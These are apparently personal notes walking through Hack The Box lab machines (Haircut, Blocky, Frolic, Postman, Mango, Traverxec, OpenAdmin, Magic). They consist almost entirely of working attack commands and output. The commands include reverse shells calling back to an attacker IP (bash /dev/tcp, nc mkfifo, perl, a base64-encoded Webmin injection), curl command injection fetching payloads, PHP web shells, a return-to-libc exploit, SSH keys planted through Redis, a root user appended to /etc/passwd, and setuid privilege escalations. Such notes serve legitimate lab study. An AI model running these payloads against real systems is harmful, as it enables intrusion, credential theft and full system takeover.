	ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
	ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
	ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
	#check pam vversion  and pam version 1.1.0 are vulnerable
	#https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html cover how the exploit works
searchsploit -m 14339
>chmod a+x 14339.sh
>./14339.sh
	/bin/bash^M: bad interpreter
	#not a UNIX format, fix to UNIX format
>sed -i -e 's/\r$//' 14339.sh
>sed -i 's/\r//' 14339.sh
>sed -i -e 's/^M//' 39545.sh
>./14339.sh
	...
	[+] Success! Use password toor to get root
#id
	uid=0(root) gid=0(root) groups=0(root)









Haircut Hackthebox
=========================================
sudo autorecon 10.10.10.24
cat tcp_80_http_dirb.txt
http://10.10.10.24/hair.html
http://10.10.10.24/uploads/
	#403 Forbiden
	#running dirbuster again got another url
http://10.10.10.24/exposed.php
	http://localhost/test.html
	#looks like running curl, confirmed with my listener
	http://10.10.14.16/rce.php
nc -lvp 80
	GET /rce.php HTTP/1.1
	User-Agent: curl/7.47.0
http://10.10.10.24/exposed.php
	http://10.10.14.16/rce.php
	#downloaded but command not executed
	http://10.10.14.16/rce.php && id
	#wildchar are not allowed
	http://10.10.14.16/rce.php -o rce.php
	#got error permission denied, on dirb the box has directory 'uploads', maybe its writable
	http://10.10.14.16/rce.php -o /var/www/html/uploads/rce.php
http://10.10.10.24/uploads/rce.php
	#yes it is, reverse shell
>id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
>cat /home/maria/.tasks/task1
	mysql_id = mysql_connect('127.0.0.1', 'root', 'passIsNotThis');
	#got credz mysql as root
>mysql -u root -p
>show databases;
>use mysql;
>show tables;
>describe user;
>select user,authentication_string from user;
	+------------------+-------------------------------------------+
	| user             | authentication_string                     |
	+------------------+-------------------------------------------+
	| root             | *81F4E77C4D1518B281A9868B9E65F1471963C990 |
	| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
	| debian-sys-maint | *A48D3E47ECD8FE668DBB31FF95D0A0F00B734D8A |
	+------------------+-------------------------------------------+
	#leads to nothing
>bash linpeas.sh | tee www-haircut-linpeas.txt
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x 1 root   root        1.6M May 19  2017 /usr/bin/screen-4.5.0
	#exploit screen 4.5
>screen -v
	Screen version 4.05.00 (GNU) 10-Dec-16
gcc -fPIC -shared -ldl -o libhax.so libhax.c
	#got warning but libhax.so been created
>cp /bin/bash /tmp/rootbash
	#rather create bash setuid, I copied bash from machine, more stable since I can compile gcc on target
>cd /etc
	#important to run screen in /etc directory
>umask 000
>screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/jembot/libhax.so"
>cat ld.so.preload
	[+] done!
>ls -laht
	-rw-rw-rw-   1 root www-data   23 Oct  8 18:27 ld.so.preload
	#/etc/ld.so.preload holds a list of libraries that will attempt to be loaded each time any program is run.
	#So the next time something runs as root, the malicious library will run as root.
	#The script kicks that off by calling screen again
>screen -ls
	[+] done!
>/tmp/rootbash -p
#whoami
	root
	##after read some walktrough there are another method to get RCE
	#abuse curl function
http://10.10.10.24/exposed.php
	--help
	#showing curl help
	-T exposed.php 10.10.14.16
nc -lvp 80
	#can read file, got source code of exposed.php, also can read /etc/passwd
http://10.10.10.24/exposed.php
	-T /etc/passwd 10.10.14.16
	#since curl running in bash, I don't check all wildcard
	#abuse bash with $(id) or `id`
http://10.10.10.24/exposed.php
	10.10.14.16/$(ping -c1 10.10.14.16)
	#got rce
	10.10.14.16/`id`
nc -lvp 80
	GET /uid=33(www-data) HTTP/1.1
http://10.10.10.24/exposed.php
	10.10.14.16/$(wget 10.10.14.16/rev.py -O /tmp/rev.py)
	10.10.14.16/$(chmod 777 /tmp/rev.py)
	10.10.14.16/$(/tmp/rev.py)
nc -lvp 443
>whoami
	www-data










Blocky Hackthebox
==========================================
sudo autorecon 10.10.10.37
cat tcp_80_http_dirb.txt
	http://10.10.10.37/wiki
http://10.10.10.37/wiki
	#got nothing
http://10.10.10.37/
	#running wordpress
wpscan --url http://10.10.10.37/ -e u,ap,at,cb --plugins-detection aggressive
	#on post author said "...We are currently developing a wiki system for the server and a core plugin to..."
http://10.10.10.37/plugins/
wget http://10.10.10.37/plugins/files/BlockyCore.jar
wget http://10.10.10.37/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
	#extract jar file
unzip BlockyCore.jar
file com/myfirstplugin/BlockyCore.class
	compiled Java class data, version 52.0 (Java 1.8)
	#read java file, install javap on kali linux
	#sudo apt-get install openjdk-11-jdk-headless
javap -c BlockyCore.class
strings BlockyCore.class
	#read java file by decompile java file
http://www.javadecompilers.com
	#upload BlockyCore.class and decompile
	...
	 public BlockyCore() {
		this.sqlHost = "localhost";
		this.sqlUser = "root";
		this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
	...
http://10.10.10.37/phpmyadmin
	#insert wordpress new user with password 'asdasd'
	INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (NULL, 'jembot', '$P$BtkxmArVfVapSr.76.rOZF4lfwEinh.', 'jembot', 'jembot@blockcraftfake.com', '', '2017-07-02 23:49:07', '', '0', 'jembot');
	#notch password hash
	SELECT user_pass,user_login FROM `wp_users` WHERE 1 
		noch:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
	#crack wordpress hash
hashcat -a 0 -m 400 hash.txt /opt/rockyou.txt
http://10.10.10.37/admin
	#login, edit template, wordpress reverse shell
http://10.10.10.37/wp-content/themes/twentysixteen/404.php
>whoami
	www-data
	#upgrade reverse shell full tty
	#https://oscp.infosecsanyam.in/shells/reverse-shell-to-fully-interactive
>export TERM=xterm-256color
stty size
	49	192
>stty rows 49 columns 192
>bash linpeas.sh | tee www-blocky-linpeas.txt
	#linpeas got nothing, enumerating another got nothing, user notch running java, try to inject jar file with reverse shell
msfvenom -l payload | grep java
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f jar -o rev.jar
	#got nothing
	#harvest password phpmyadmin database, password wordpress database
>cat /var/www/html/wp-config.php
	define('DB_USER', 'wordpress');
	define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
>cat /etc/phpmyadmin/config-db.php
	$dbuser='phpmyadmin';
	$dbpass='8YsqfCTnvxAUeduzjNSXe22';
>mysql -u root -p
>use mysql
>select user,authentication_string from user;
	+------------------+-------------------------------------------+
	| user             | authentication_string                     |
	+------------------+-------------------------------------------+
	| root             | *BB78FB43108F3D7908EE652FE06412115B52DD43 |
	| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
	| debian-sys-maint | *0431C3E3F19B1A42C712329161B6DC6BD281D4B4 |
	| phpmyadmin       | *BB78FB43108F3D7908EE652FE06412115B52DD43 |
	| wordpress        | *66A834CEBA73E895A1AE4A4C6E9A973A2E3222F6 |
	+------------------+-------------------------------------------+
	#try to crack every hash and use password to notch
>su notch
	#using root password database 8YsqfCTnvxAUeduzjNSXe22 from file BlockyCore.class
	#shit i can ssh at the begining, why bothering reverse shell as www from wordpress
>whoami
	notch
>sudo -l
	(ALL : ALL) ALL
>sudo su
#wohami
	root











Frolic Hackthebox
=========================================
sudo autorecon 10.10.14.16
cat tcp_1880_http_dirb.txt
http://10.10.10.111:1880/
	Node-RED web application
searchsploit nodered
searchsploit node red
	#no exploit found, searching on google got node-red rce
	#https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
	#https://gist.github.com/QKaiser/79459c3cb5ea6e658701c7d203a8c297
	#but required credentials, tried default credz NR_account/NodeRed#0123 but failed, so moved on
cat tcp_9999_http_dirb.txt
	==> DIRECTORY: http://10.10.10.111:9999/admin/
	==> DIRECTORY: http://10.10.10.111:9999/backup/
	==> DIRECTORY: http://10.10.10.111:9999/dev/
	==> DIRECTORY: http://10.10.10.111:9999/test/
http://10.10.10.111:9999/backup/password.txt
http://10.10.10.111:9999/backup/user.txt
	#got credz admin:imnothuman
http://10.10.10.111:9999/admin
	#admin panel login, every 3 fail attempt need to reload, I assume I handle by js
	#check on burp request send to http://10.10.10.111:9999/admin/js/login.js
http://10.10.10.111:9999/admin/js/login.js
	....
	if ( username == "admin" && password == "superduperlooperpassword_lol")
	#got credz admin:superduperlooperpassword_lol
http://10.10.10.111:9999/admin/success.html
	….. ….. ….. .!?!! !!!! !!!! !!!!! !!!.?
	#got weird encryption, google "decode <encoded string>" found out ook language
	#https://www.dcode.fr/ook-language
https://www.dcode.fr/ook-language
    Nothing here check /asdiSIAJJ0QWE9JAS
http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
	UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJA....snip....
	#look like base64 encryption
curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > file
file file
	file: Zip archive data, at least v2.0 to extract
	#bruteforce zip
fcrackzip -u -D -p /opt/rockyou.txt file
	#got password 'password'
unzip file
	#got file index.php
cat index.php
	KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr....snip....
	#look like hexa, decode hexa file
cat index.php | xxd -r -p
	+++++ +++++ [->++ +++++ +++<] >++++ +.--- --........snip.......
	#google by "decode <encrypted strings>' found this website
	#https://www.dcode.fr/brainfuck-language
https://www.dcode.fr/brainfuck-language
	idkwhatispass
	#try to use it on red-node, smb, rpc but failed
http://10.10.10.111:9999/dev/
	#403 Forbiden
gobuster dir -u http://10.10.10.111:9999/dev/ -w /opt/directory-list-2.3-medium.txt -x --timeout 50s -t 170
	/test                 (Status: 200) [Size: 5]
	/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
http://10.10.10.111:9999/dev/backup
http://10.10.10.111:9999/playsms/
	#playsms web service, login with admin:idkwhatispass
searchsploit playsms
	#got many exploit rce
seachsploit -m 42038
	#exploit inject user agent with <?php exec?>, trigger rce by login > Reports > Report whose online
	#edit user agent burp > proxy > options > match and replace > Match = ^User-Agent.*$ > Replace User-Agent: <?php phpinfo();> > Regex match
	#login and chech reports whose login got nothing
searchsploit -m 42003
	#rce by upload file and change name to <?php exec>?
	#upload and change file name to <?php phpinfo();?>.csv
	#failed and moveon
	#another rce https://www.youtube.com/watch?v=KIB9sKQdEwE
	#login > My Account > Phonebook > Click import image > create csv file > upload csv file
cat file.csv
	Name,Mobile,Email,Group code,Tags
	Lucas,1234,lucas@gmail.com,2,jembot
	<?php phpinfo();?>,1234,jembot@jembot.jembot,3,haha
	#got rce
	<?php system('wget 10.10.14.16/p0wny.php');?>,1234,jembot@jembot.jembot,3,haha
http://10.10.10.111:9999/playsms/p0wny.php
	bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'
>whoami www-data
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x 1 root   root       7.4K Sep 25  2018 /home/ayush/.binary/rop
>/home/ayush/.binary/rop
	[*] Usage: program <message>
>/home/ayush/.binary/rop asdasdasdasd
	[+] Message sent: asdasdasdasd
	#looklike buffer overflow and from name is rop I think should use rope chain
	#but rope chain is hard BoF and the machine is easy, I try another method
	#buf rop return to libc
>cd /home/ayush/.binary/
	#check libc addres, 0xb7e19000
>ldd libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
	#check system address, 0003ada0
>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
	627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
	#check exit address, 0002e9d0
>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
	141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
	#check /bin/sh address, 15ba0b
>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
	15ba0b /bin/sh
	#exploit payload = pattern + sys_addr + exit_addr + sh_addr
cat ex.py
	from subprocess import call
	import struct
	
	libc_addr = 0xb7e19000
	sys_addr = struct.pack("<I", libc_addr+0x0003ada0)
	sh_addr = struct.pack("<I", libc_addr+0x15ba0b)
	exit_addr = struct.pack("<I", libc_addr+0x0002e9d0)
	
	buf = "A"*52
	buf += sys_addr
	buf += exit_addr
	buf += sh_addr
	print (buf)
>/home/ayush/.binary/rop $(python /tmp/ex.py)
#id
	uid=0(root) gid=33(www-data) groups=33(www-data)
	#after read writeup, this return to libc are the right part, awesome








Postman HTB
======================================
sudo autorecon 10.10.10.160
cat tcp_80_http_dirb.txt
http://postman/
http://postman/upload/
	#got nothing
http://postman:10000
	#webmin, login with default credz are failed
nmap -p- -sV 10.10.10.160
	6379/tcp  open  redis   Redis key-value store 4.0.9
	#somehow my autorecon miss redis port
	#https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
	#create php reverse shell
redis-cli -h 10.10.10.160
>config set dir /var/www/html/
>config set dbfilename rce.php
>set test "<?php phpinfo(); ?>"
>save
	(error) ERR
	#error write file, maybe not writeable
	#redis add ssh key
ssh-keygen -t rsa
(echo -n "\"\n\n"; cat redis.pub; echo -n "\n\n\"") > pubkey.txt
		##redis RCE https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
cat pubkey.txt | redis-cli -h 10.10.10.160 -x set sshkey
>info
	redis_version:4.0.9
>get sshkey
	"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDauB4xAEg...snip...sdasdU= root@Kali\n\n\n\n"
>config set dir /var/lib/redis/.ssh
>config get dir
	2) "/var/lib/redis/.ssh"
>config set dbfilename authorized_keys
>config get dbfilename
	2) "authorized_keys"
>save
	OK
ssh -o IdentitiesOnly=yes -l redis -i redis 10.10.10.160
>whoami
	redis
>find / -name "*.bak" -print -execdir ls -la {} \; 2>/dev/null
>cat /opt/id_rsa.bak
	#bruteforce ssh key, crack ssh key, just like Valentine Box
python /usr/share/john/ssh2john.py matt_private_key.txt > matt_private_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_private_key.hash
	computer2008     (Matt_idrsa)
>su Matt
>ls -lah /var/www/
	#webmin rce update package
msfconsole
use exploit/linux/http/webmin_packagup_rce
>set rhost 10.10.10.160
>set lhost 10.10.12.120
>set ssl true
>set username Matt
>set password computer2008
>exploit
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash
ssh rooot@10.10.10.160
		##change format passwd and shadow
		##reference shadow: https://www.cyberciti.biz/faq/understanding-etcshadow-file/
nano /etc/shadow
nano /etc/passwd
	#exploit webmin update package rce without metasploit
https://postman:10000/
https://postman:10000/sysinfo.cgi?xnavigation=1
	Webmin version 	1.910
	#login > system > software package update > package updates > uncheck all > select (check) one (xxd) > update selected package
https://postman:10000/package-updates/?xnavigation=1
	#intercept to burp
POST /package-updates/update.cgi HTTP/1.1
	mode=updates&search=&u=xxd%2Fapt&ok=Update+Selected+Packages
	#update payloadb64
	mode=&search=&u=xxd/apt&u= bash -c "{echo,payloadb64}}|{base64,-d}|{bash,-i}"&ok=Update+Selected+Packages
	mode=updates&search=&u=xxd%2Fapt&u=+|+bash+-c+"{echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgMTAuMTAuMTQuMTYgNDQzID4vdG1wL2Y%3d}|{base64,-d}|{bash,-i}"&ok=Update+Selected+Packages
	#reverse shell perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.16:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.16 LPORT=443
	#reverse shell that always works on UNIX
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 443 >/tmp/f
	mode=updates&search=&u=xxd%2Fapt&u=+|+bash+-c+"{echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgMTAuMTAuMTQuMTYgNDQzID4vdG1wL2Y%3d}|{base64,-d}|{bash,-i}"&ok=Update+Selected+Packages
	u=xxd/apt&u= | bash -c "{echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTYgNDQzID4vdG1wL2Y=}|{base64,-d}|{bash,-i}"
	u=xxd%2Fapt&u=+|+bash+-c+"{echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgMTAuMTAuMTQuMTYgNDQzID4vdG1wL2Y%3d}|{base64,-d}|{bash,-i}"








Mango Hackthebox
=====================================
sudo autorecon 10.10.10.162
cat tcp_443_sslscan.txt
	CN=staging-order.mango.htb
https://staging-order.mango.htb/
https://mango.htb/
	#https staging and manggo only has same landing page
https://mango.htb/
	#got error
https://10.10.10.162/analytics.php
	#after finish the box, ivanit said its vulnerable to csv injection
	#http://georgemauer.net/2017/10/07/csv-injection.html
	#but seems all functions are disabled
http://mango.htb/
http://staging-order.mango.htb/
	#mango login page, look like custom index.php
gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.html,.txt,.db --timeout 50s -t 100
	/home.php
	/vendor/
	##exploit no sql mongodb
	#https://book.hacktricks.xyz/pentesting-web/nosql-injection
	#auth bypass nosql mongodb
http://staging-order.mango.htb/
	POST / HTTP/1.1
	username[$ne]=user&password[$ne]=pass&login=login
http://staging-order.mango.htb/home.php
	#login success and redirected to home.php
	##nosql blind enumeration with regex
wget https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -op login:login -ep username -m POST
	2 username(s) found:
	admin
	mango
python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -op login:login -ep password -m POST
	2 password(s) found:
	h3mXK8RhU~f{]f5H
	t9KcS3>!0B#2
ssh mango@10.10.10.162
>whoami
	mango
>find /home/mango
	./.cache/motd.legal-displayed
	#exploit motd pam linux are vulnerable under 1.0 version
>dpkg -l | grep pam
	ii  libpam-runtime	1.1.8-3.6ubuntu2	all	Runtime support for the PAM library
>bash linpeas.sh | tee mango-mango-linpeas.txt
	#linpeas got nothing
	#enumerate mongodb, dump mongodb
>head index.php
	....
	$client = new MongoDB\Client("mongodb://localhost:27017");
>mongo mongodb://localhost:27017
>show dbs
	admin   0.000GB
	config  0.000GB
	local   0.000GB
	mango   0.000GB
>use mango
>show collections
	startup_log
>show tables
	users
>db.users.find().pretty()
	"username" : "mango",
	"password" : "h3mXK8RhU~f{]f5H"
	#got username and password already have
	#change user to admin
>su admin
>find /home/admin/
>bash linpeas.sh | tee admin-mango-linpeas.sh
	[+] Checking Pkexec policy
	AdminIdentities=unix-group:sudo;unix-group:admin
>id
	uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
	#pkexec privesc
>/usr/bin/pkexec /usr/bin/id
>/usr/bin/pkexec /bin/sh
	ERROR:pkexec.c:718:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
	Aborted (core dumped)
	#got error and failed
	##privesc jjs
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-sr-- 1 root   admin            11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
	#https://gtfobins.github.io/gtfobins/jjs/
>echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/bin/jjs
#?
	#poped up root shell but hang and not responding
	#read file
>echo 'var BufferedReader = Java.type("java.io.BufferedReader");
>var FileReader = Java.type("java.io.FileReader");
>var br = new BufferedReader(new FileReader("/root/root.txt"));
>while ((line = br.readLine()) != null) { print(line); }' | /usr/bin/jjs
	1f8ea92d9470b63e05316f96c9c60a0a
	#got root flag
	#jjs rce
>jjs -scripting
jjs> $EXEC("id")
	uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
jjs> $EXEC("cp /bin/bash /tmp/rbash")
jjs> $EXEC("chown root:root /tmp/rbash")
jjs> $EXEC("chmod +s /tmp/rbash")
jjs> quit()
>/tmp/rbash -p
#id
	uid=4000000000(admin) gid=1001(admin) euid=0(root) egid=0(root) groups=0(root),1001(admin)





Traverxec Hackthebox
=========================================
sudo autorecon 10.10.10.165
cat tcp_80_http_dirb.txt
http://10.10.10.165/
	#nothing interesing inside webservice
cat tcp_80_http_nikto.txt
	+ Server: nostromo 1.9.6
searchsploit nostromo
	nostromo 1.9.6 - Remote Code Execution
searchsploit -m 47837
python 47837.py 10.10.10.165 80 id
	#got error
cat 47837.py
	...snip...
	print (payload)
	....
	#edit payload and send it to burpsuite
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
	echo
	echo
	ping -c2 10.10.14.16 2>&1
	#got error, but changed with ping success rce, change with python reverse shell
	which python | nc 10.10.14.16 443 2>&1
	which python | nc 10.10.14.16 443 2>&1
>whoami
	www-data
>cd /home/david
>ls -laht
	ls: cannot open directory '.': Permission denied
	#restricted home directory
>bash linepas.sh | tee www-data-traverxec-linpeas.txt
>cat /var/nostromo/conf/.htpasswd
	david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
	#crack shadow, crack md5 unix
hashid '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/'
	[+] MD5 Crypt
>cat /etc/passwd /tmp/passwd.txt
>cat /var/nostromo/conf/.htpasswd > shadow.txt
unshadow passwd.txt shadow.txt > jcrack.txt
john jcrack.txt --wordlist=/opt/rockyou.txt
	Nowonly4me       (david)
	#got david password, but failed to escalate to david
>su david
>ssh david@10.10.10.165
	#enumerate nostromo
>cat /var/nostromo/conf/nhttpd.conf
	...snip...
	homedirs			/home
	homedirs_public		public_www
	#nostromo homedir config
>man nostromo
https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd
	#homdedir option default defined by /home and accessed with ~user
	#and restrict home directories to a single sub directory by defining it via the homedirs_public
	#so home directory david should be ~david and restricted subdirectory are public_www
http://10.10.10.165/~david
	#got david directory, but nothing interesting here
dirb http://10.10.10.165/~david -X .php,.html,.txt
http://10.10.10.165/~david/public_www/
http://10.10.10.165/public_www/~david/
http://10.10.10.165/public_www/
http://public_www.traverxec.htb/~david
http://public_www.traverxec.htb/
	#failed got nothing, after enough digging webservice try to enumerate david home
>cd /home/david
>cd public_www
	#got suprised there are public_www directory inside david and I can read it
>ls
	index.html protected-file-area
>cd protected-file-area
>ls
	backup-ssh-identity-files.tgz
>cp backup-ssh-identity-files.tgz /tmp/jembot
>tar -tf backup-ssh-identity-files.tgz
	home/david/.ssh/authorized_keys
	home/david/.ssh/id_rsa
	home/david/.ssh/id_rsa.pub
>tar -xzvf backup-ssh-identity-files.tgz 
>ssh david@localhost -i id_rsa
	#crack ssh
python /usr/share/john/ssh2john.py david_idrsa > jdavid_idrsa
john jdavid_idrsa --wordlist=/opt/rockyou.txt
	hunter           (david_idrsa)
ssh -i david_idrsa david@10.10.14.16
>whoami
	david
>cd ~/bin/
>cat server-stats.sh 
	....
	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
	#there are sudo command
>sudo -l
	#I check sudo capability required password, and I dont have password
>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
	#I can run sudo with that command, that should be on /etc/sudoers
	#sudo journalctl privesc
	#journalctl will print output, but if stdout doen't fit then will print output with less
	#-n5 option means only 5 lines output
	#so i make small my terminal with tmux then run it
>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/sh
#whoami
	root
	







OpenaAmin Hackthebox
=========================================
sudo autorecon 10.10.10.17
cat tcp_80_http_dirb.txt
http://10.10.10.171:80/artwork/
http://10.10.10.171:80/music/
http://10.10.10.171:80/artwork/
http://10.10.10.171:80/sierra/
	#nothing interesting
http://10.10.10.171:80/ona/
	#OpenNetAdmin version 18.1.1 web service
searchsploit OpenNetAdmin
	OpenNetAdmin 18.1.1 - Remote Code Execution    | php/webapps/47691.sh
	#exploit OpenNetAdmin 18.1.1 RCE
searchsploit -m 47691
./47691.sh
	./47691.sh: 23: Syntax error: "done" unexpected (expecting "do")
	#error expecting do, examine exploit
cat 47691.sh | tr -d '\r' >> ex.sh
./ex.sh 
	#configure proxychains to modified exploit in burp
sudo nano /etc/proxychains4.conf
	[ProxyList]
	http    127.0.0.1 8080
proxychains ./ex.sh 'http://10.10.10.171/ona/'
	POST /ona/ HTTP/1.1
	xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";which python3;echo "END"&xajaxargs[]=ping
	#python3 reverse shell
	xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";nc 10.10.14.16 80 | python;echo "END"&xajaxargs[]=ping
>whoami
	www-data
>bash linpeas.sh | tee www-traverxec-linpeas.txt
	#mysql running on localhost
>netstat -lntp
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
	#find mysql credentials, look like openadmin use mysql, looking openadmin config file
>cat /opt/ona/www/local/config/database_settings.inc.php
	'db_login' => 'ona_sys',
	'db_passwd' => 'n1nj4W4rri0R!',
	#without enumerate mysql I can login with that password to jimmy
>su jimmy
>find / -user jimmy 2>/dev/null | grep -v 'proc\|mem\|cache'
	/var/www/internal
>ls /var/www/internal
	index.php  logout.php  main.php
>cat /var/www/html/index.php
	if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'
	#password sha512, cracked on crackstation.net as 'Revealed'
>cat /var/www/interal/main.php
	$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
	#I found entry point to excalate to joanna
	#looks like another web service
	#check apache config file, apache virtual webserver
>cat /etc/apache2/sites-enabled/internal.conf 
	<VirtualHost 127.0.0.1:52846>
		ServerName internal.openadmin.htb
		DocumentRoot /var/www/internal
http://internal.openadmin.htb
http://internal.openadmin.htb/main.php
	#failed, apache listen only on localhost
	#ssh tunnel
>~C
>ssh> -L 52846:localhost:52846
	Forwarding port.
http://localhost:52846/main.php
	#got joanna private key id_rsa, after I read writeup I can curl to main.php, even with www-data user
>curl localhost:52846/main.php
	#crack ssh, crack idrsa, crack id_rsa
/usr/share/john/ssh2john.py joanna_idrsa > johnjoana.txt
john johnjoana.txt --wordlist=/opt/rockyou.txt
	bloodninjas      (joanna_idrsa)
ssh joanna@10.10.10.171 -i joanna_idrsa
>sudo -l
	(ALL) NOPASSWD: /bin/nano /opt/priv
	#nano privesc
>sudo /bin/nano /opt/priv
	Ctrl-R
	Ctrl-X
	Command to execute: reset; bash 1>&0 2>&0
#id
	uid=0(root) gid=0(root) groups=0(root)
#echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd





Magic hackthebox
====================================
sudo autorecon 10.10.10.185
cat tcp_80_http_dirb.txt
http://10.10.10.185/login.php
	#login with sql 'or 1=1-- -  <or>   admin' or '1'='1
http://10.10.10.185/upload.php
	#or without logit but intercept response upload.php from 302 Found to 2-- OK
	#change config on burp to replace 302 Found to 200 OK
	#upload shell asd.php.jpg
	#<?php echo system($_GET['c']);?>
http://10.10.10.185/image/uploads/asd.php?c=id
http://10.10.10.185/image/uploads/asd.php?c=wget 10.10.14.16/p0wny.php
http://10.10.10.185/image/uploads/p0wny.php
	#reverse shell with python3
>whoami
	www-data
	#home directory unreable, since intial foothold using sqli, there must be sql running
>cat db.php5
	private static $dbUsername = 'theseus';
	private static $dbUserPassword = 'iamkingtheseus';
	#but there are no mysql binarry on machine
	#ssh tunnel port mysql
sudo nano /etc/ssh/sshd_config
sudo service ssh start
>ssh kali@10.10.14.16
ssh> -R 3306:localhost:3306
mysql -u theseus -p
	ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/run/mysqld/mysqld.sock' (2)
	#got error no mysql running, but when I run nmap on localhost there are msql running
	#actually I need to spesified host with -h flag
mysql -u theseus -p -h 127.0.0.1
>use Magig;
>select * from magic;
	#got credz admin:Th3s3usW4sK1ng
>su theseus
	#create ssh key
>cd .ssh
ssh-keygen
cat theseus.pub
>nano authorized_keys
>chmod 600 authorized_keys
ssh theseus@10.10.10.185 -i theseus
>id
	uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
	#got unusual groups, find file groups belonging group belonging
>find / -group users -ls 2>/dev/null
	393232     24 -rwsr-x---   1 root  users   22040 Oct 21  2019 /bin/sysinfo
>file /bin/sysinfo
	/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, Build...
	#examine binary
>strings /bin/sysinfo
	...snap...
	lshw -short
	fdisk -l
	free -h
>ltrace -s 100 /bin/sysinfo
	....snap...
	popen("lshw -short", "r")                                                                      = 0x5584bfe74280
	popen("fdisk -l", "r")                                                                         = 0x5584bfe74280
	popen("cat /proc/cpuinfo", "r")                                                                = 0x5584bfe74280
